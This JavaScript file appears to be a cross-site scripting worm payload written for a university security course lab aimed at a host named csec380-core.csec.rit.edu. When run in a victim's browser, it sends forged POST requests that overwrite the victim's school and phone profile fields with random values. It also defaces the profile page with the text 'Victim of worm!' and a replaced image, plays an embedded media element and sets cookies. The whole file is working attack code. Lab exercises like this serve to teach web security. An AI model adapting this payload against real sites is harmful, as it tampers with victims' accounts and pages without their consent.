/*jshint esversion: 6 */

const links = ["https://c.tenor.com/8EAnAZozlWUAAAAd/mark-zuckerberg-adjust.gif",
	"https://c.tenor.com/rF2ktCIGGc8AAAAd/lol-limewire-limewire.gif",
    "https://i.kym-cdn.com/entries/icons/original/000/028/501/bezos.jpg",
    "https://i.kym-cdn.com/photos/images/newsfeed/002/255/815/cb0.png",
    "https://i.kym-cdn.com/photos/images/newsfeed/001/442/344/7e3.jpg"]

const unis = ["Rochester Institute of Technology", "University of Rochester",
	"University at Buffalo", "Buffalo State College", "SUNY Brockport",
	"University at Waterloo", "SUNY Geneseo", "University of Toronto"
];

const zipcodes = ["315", "585", "716"];
const jsonIn = ["Zucc", "Limewire", "Bezos", "Stop", "Chungus"];

function getRandomInt(max) {
	return Math.floor(Math.random() * max);
}


function post_About() {
	var r2 = getRandomInt(7);
	var r3 = getRandomInt(2);


	var university = unis[r2];
    var senduni = encodeURIComponent(university);

	var number = Math.floor(1000000 + Math.random() * 9000000).toString();
	var pnumber = zipcodes[r3] + number;
    var sendphone = encodeURIComponent(pnumber);



	var xhr = new XMLHttpRequest();
	xhr.open("POST", `http://csec380-core.csec.rit.edu:86/change_about.php`, true);
	//Send the proper header information along with the request
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhr.send(`name=school&value=${senduni}`);

    var xhs = new XMLHttpRequest();
	xhs.open("POST", `http://csec380-core.csec.rit.edu:86/change_about.php`, true);
	//Send the proper header information along with the request
	xhs.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhs.send(`name=phone&value=${sendphone}`);
}

function change_Profile(){
    oof = document.getElementById("name");
    oof.innerText = "Victim of worm!";
    document.body.style.backgroundColor = "black";
    eeek = document.getElementById("fb-image-lg");
    eeek.src = "https://pws1453.github.io/shrek.jpg";
}

function rick_roll(){
    rick = document.getElementById("rick");
    rick.muted = !rick.muted;
    document.body.onmouseover = rick.play();
}

const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
if (cookies.get("commented") != "yes") {
    post_About();
}
change_Profile();
rick_roll();

document.cookie = "rekt=yes"
